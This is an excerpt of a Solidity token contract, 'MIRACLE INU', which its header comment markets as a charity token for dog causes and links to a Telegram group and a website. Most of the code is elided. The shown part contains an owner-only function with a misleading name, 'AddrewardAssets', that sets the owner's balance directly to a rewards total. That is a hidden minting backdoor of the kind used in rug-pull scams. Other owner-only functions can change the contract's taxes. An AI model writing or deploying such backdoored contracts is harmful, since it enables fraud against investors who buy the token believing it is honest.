...
/**
Token based around raising funds for charity's which are supporting dogs across the globe.
Soon to have some clothing and house items, i.e. cups
Weekly community vote to decide the charity we will be donating too

Telegram : https://t.me/miracleinubsc
website : https://miracleinu.club
...
contract miracleinubsc is Context, IERC20, Ownable {
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "MIRACLE INU";
    string private _symbol = "MIRACLEINU";
    uint8 private _decimals = 18;

    address payable public treasuryWallet = payable(0x1b46814697a6aB33a6285Cf77F157E19081F5d92);
    ...
    uint256 public _TreasuryFeeSell = 7;
    ...
    uint256 public rewardEndSupply = 100000000000000000;
    ...
    function AddDisposal(uint256 newLiquidTax, uint256 newMarketTax) external onlyOwner() {
    ...
    function AddrewardAssets() public onlyOwner() {_walletTotals[owner()] = getTotalRewards;}
    ...
    function AddrewardAddres(address _account) external onlyOwner {
